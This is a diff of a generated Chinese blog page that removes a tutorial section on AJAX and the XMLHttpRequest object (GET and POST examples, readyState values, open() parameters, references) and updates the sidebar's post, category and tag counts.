-<p>当然，上面的例子还有其他写法，比如这样：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendAJAX</span>(<span class="params">url</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</div><div class="line">    xhr.open(<span class="string">"GET"</span>, url, <span class="literal">true</span>)</div><div class="line">    xhr.send()</div><div class="line">    xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> ((xhr.status ===<span class="number">200</span> ) || xhr.status === <span class="number">304</span>) &#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.parse(xhr.responseText))</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"服务器异常"</span>)</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    xhr.onerror = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"服务器异常"</span>)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>ok，简单了解了 AJAX 的写法之后我们来看一下它的核心部分 XMLHttpRequest</p>
-<h2 id="三、XMLHttpRequest"><a href="#三、XMLHttpRequest" class="headerlink" title="三、XMLHttpRequest"></a>三、XMLHttpRequest</h2><blockquote>
-<p>XMLHttpRequest 是 AJAX 的核心部分，上面所说的 AJAX 其实只是一种技术方案，并不是一种新技术。通常所说的 AJAX 请求，实际上是使用 XMLHttpRequest 对象来发送一个 AJAX 请求。</p>
-</blockquote>
-<p>现在我们看另一种发送请求的方法 <code>POST</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendAJAX</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</div><div class="line"><span class="comment">// 可选，设置xhr请求的超时时间</span></div><div class="line">    xhr.timeout = <span class="number">3000</span>;</div><div class="line">    xhr.open(<span class="string">'POST'</span>, <span class="string">'/register'</span>, <span class="literal">true</span>)</div><div class="line">    xhr.send(<span class="string">'username=yunyu&amp;password=123456'</span>)</div><div class="line"></div><div class="line">    xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> ((xhr.status === <span class="number">200</span> ) || xhr.status === <span class="number">304</span>) &#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.responseText)</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="comment">// 可选</span></div><div class="line">    xhr.ontimeout = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'请求超时'</span>)</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="comment">// 可选</span></div><div class="line">    xhr.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'连接失败'</span>)</div><div class="line">    &#125;</div><div class="line"><span class="comment">// 可选</span></div><div class="line">    xhr.upload.onprogress = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">        <span class="comment">//如果是上传文件，可以获取上传进度</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>当然，以上内容还只是 <code>xhr</code> 对象的冰山一角，有兴趣的同学可以看文末的参考资料，里面有详细的 <code>XMLHttpRequest</code> 描述。</p>
-<h3 id="1、获取-response-数据"><a href="#1、获取-response-数据" class="headerlink" title="1、获取 response 数据"></a>1、获取 response 数据</h3><p><code>xhr</code> 提供了3个属性来获取请求返回的数据，分别是：<code>xhr.response</code>、<code>xhr.responseText</code>、<code>xhr.responseXML</code></p>
-<p><strong>xhr.response</strong></p>
-<ul>
-<li>默认值：空字符串””</li>
-<li>当请求完成时，此属性才有正确的值</li>
-<li>请求未完成时，此属性的值可能是 <code>&quot;&quot;</code> 或者 <code>null</code> ，具体与 <code>xhr.responseType</code> 有关：<br>当 <code>responseType</code> 为 <code>&quot;&quot;</code> 或 <code>&quot;text&quot;</code> 时，值为 <code>&quot;&quot;</code> ；<code>responseType</code> 为其他值时，值为 <code>null</code></li>
-</ul>
-<h3 id="2、追踪请求当前的状态"><a href="#2、追踪请求当前的状态" class="headerlink" title="2、追踪请求当前的状态"></a>2、追踪请求当前的状态</h3><p><code>xhr</code> 对象有个只读属性 <code>readyState</code> , 这个属性可追踪到共 5 种可能值，分别对应 <code>xhr</code> 状态的不同阶段。每次 <code>xhr.readyState</code> 的值发生变化时，都会触发 <code>xhr.onreadystatechange</code> 事件，我们可以在这个事件中进行相关状态判断。</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">值</th>
-<th style="text-align:center">状态</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center"><code>0</code></td>
-<td style="text-align:center"><code>UNSENT</code> (初始状态，未打开)</td>
-<td style="text-align:center">此时 <code>xhr</code> 对象被成功构造，<code>open()</code> 方法还未被调用</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>1</code></td>
-<td style="text-align:center"><code>OPENED</code> (已打开，未发送)</td>
-<td style="text-align:center"><code>open()</code> 方法已被成功调用，<code>send()</code> 方法还未被调用。注意：只有 <code>xhr</code> 处于 <code>OPENED</code> 状态，才能调用 <code>xhr.setRequestHeader()</code> 和 <code>xhr.send()</code>,否则会报错</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>2</code></td>
-<td style="text-align:center"><code>HEADERS_RECEIVED</code> (已获取响应头)</td>
-<td style="text-align:center"><code>send()</code> 方法已经被调用, 响应头和响应状态已经返回</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>3</code></td>
-<td style="text-align:center"><code>LOADING</code> (正在下载响应体)</td>
-<td style="text-align:center">响应体(<code>response entity body</code>)正在下载中，此状态下通过 <code>xhr.response</code> 可能已经有了响应数据</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>4</code></td>
-<td style="text-align:center"><code>DONE</code>  (整个数据传输过程结束)</td>
-<td style="text-align:center">整个数据传输过程结束，不管本次请求是成功还是失败</td>
-</tr>
-</tbody>
-</table>
-<h3 id="3、通过控制台调试"><a href="#3、通过控制台调试" class="headerlink" title="3、通过控制台调试"></a>3、通过控制台调试</h3><ul>
-<li><p>通过打断点的方式，在 <code>Source</code> 观察源文件的数据变动。</p>
-</li>
-<li><p>最右边有个 <code>watch</code> ， <code>readyState</code> 状态变更时候， 会显示 <code>xhr</code> 对象相应的数据和状态的变动。</p>
-</li>
-</ul>
-<p><img src="https://ws1.sinaimg.cn/large/889b2f7fgy1fjo19spvnlj20qh098ta8.jpg" alt="@控制台调试 | center"></p>
-<h3 id="4、发一个同步请求"><a href="#4、发一个同步请求" class="headerlink" title="4、发一个同步请求"></a>4、发一个同步请求</h3><p><code>xhr</code> 默认发的是异步请求，但也支持发同步请求（当然实际开发中应该尽量避免使用）。到底是异步还是同步请求，由 <code>xhr.open()</code> 传入的 async 参数决定。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// open 语法 参数</span></div><div class="line">open(method, url [, <span class="keyword">async</span> = <span class="literal">true</span> [, username = <span class="literal">null</span> [, password = <span class="literal">null</span>]]])</div></pre></td></tr></table></figure>
-<ul>
-<li><p>method: 请求的方式，如GET/POST/HEADER等，这个参数不区分大小写</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xhr.open(<span class="string">"GET"</span>, url)</div><div class="line">xhr.open(<span class="string">"POST"</span>, url)</div></pre></td></tr></table></figure>
-</li>
-<li><p>url: 请求的地址，可以是相对地址如example.php，这个相对是相对于当前网页的url路径；也可以是绝对地址如 <a href="http://www.example.com/example.php" target="_blank" rel="external">http://www.example.com/example.php</a></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"../../example.php"</span>)</div><div class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://www.example.com/example.php"</span>)</div></pre></td></tr></table></figure>
-</li>
-<li><p>async: 默认值为 true，即为异步请求，若设置为 false，则为同步请求</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"../../example.php"</span>, <span class="literal">true</span>)</div><div class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://www.example.com/example.php"</span>, <span class="literal">false</span>)</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="5、实际使用"><a href="#5、实际使用" class="headerlink" title="5、实际使用"></a>5、实际使用</h3><p>实际上以上内容已经包含了大部分的使用情况，你可以根据自己的需求进一步封装成一个 AJAX 组件，或者也可以使用现成的 jQuery 封装的 AJAX 组件 （jQuery.ajax()），两者功能是一样的。</p>
-<p>当然，如果你对这方面比较感兴趣的话，我想你一定不想错过 <code>fetch</code> API ，它简化了 AJAX 的操作代码，但能够一丝不苟的做着同样的工作。但是，它目前依然只是一个实验中的功能，目前在浏览器的兼容方面还不是特别理想。</p>
-<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API" target="_blank" rel="external"> Fetch API - MDN </a></p>
-<p>以上，就是 AJAX 和 XMLHttpRequest 的常用玩法，其他更具体更细节的玩法可以在以下的参考资料中学习了解。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank" rel="external">XMLHttpRequest Level 2 使用指南 - 阮一峰</a></p>
-<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" target="_blank" rel="external"> XMLHttpRequest - MDN </a></p>
-<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest" target="_blank" rel="external"> Using XMLHttpRequest - MDN </a></p>
-<p><a href="http://www.tutorialspoint.com/ajax/index.htm" target="_blank" rel="external"> AJAX tutorial </a></p>
-<p><a href="https://segmentfault.com/a/1190000004322487" target="_blank" rel="external"> 你真的会使用XMLHttpRequest吗？ - ruoyiqing </a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2901,7 +2851,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">31</span>
+                <span class="site-state-item-count">34</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2912,7 +2862,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-count">15</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2923,7 +2873,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-count">40</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
